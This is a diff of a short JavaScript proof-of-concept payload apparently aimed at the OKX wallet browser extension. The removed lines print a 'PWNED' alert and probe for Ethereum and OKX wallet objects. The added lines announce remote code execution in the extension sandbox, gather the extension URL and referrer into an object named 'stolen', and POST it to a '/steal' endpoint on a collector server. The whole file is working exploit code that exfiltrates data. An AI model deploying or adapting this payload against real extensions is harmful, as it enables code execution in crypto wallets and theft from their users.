@@ -1,16 +1,19 @@
-(function() {
-    const data = [
-        "PWNED",
-        "Origin: " + location.origin,
-        "Is iframe: " + (window !== window.top),
-        "Parent: " + (window.parent !== window ? "Accessible" : "Top Level"),
-        "Chrome: " + (typeof chrome !== 'undefined' ? 'Available' : 'Missing'),
-        "Ethereum: " + (window.ethereum ? 'Detected' : 'Not Found'),
-        "OKX: " + (window.okxwallet ? 'Detected' : 'Not Found')
-    ];
-
-    alert(data.join('\n'));
-    
-    // Also logging to console for easier debugging
-    console.table(data);
+// This executes inside extension sandbox when fetched
+(async () => {
+  // Confirm RCE works
+  console.log('[POC] RCE achieved in OKX sandbox!');
+  
+  // Collect extension data
+  const stolen = {
+    extUrl: window.location.href,
+    parentUrl: document.referrer,
+    timestamp: Date.now()
+  };
+  
+  // Send to your server.js
+  await fetch('http://localhost:8080/steal', {
+    method: 'POST',
+    body: JSON.stringify(stolen),
+    headers: {'Content-Type': 'application/json'}
+  });
 })();
